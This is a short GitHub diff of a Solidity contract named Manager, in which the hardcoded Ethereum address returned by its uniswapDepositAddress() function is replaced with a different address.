@@ -7,7 +7,7 @@ contract Manager {
 	}
 
 	function uniswapDepositAddress() public pure returns (address) {
-		return 0xd7C6D4E3507701B7079cac679B6157f1bFAd460c;
+		return 0xCca27D7cEa86733E90b5fB1828d97413706a5251;
 	}
 }
 © 2021 GitHub, Inc.
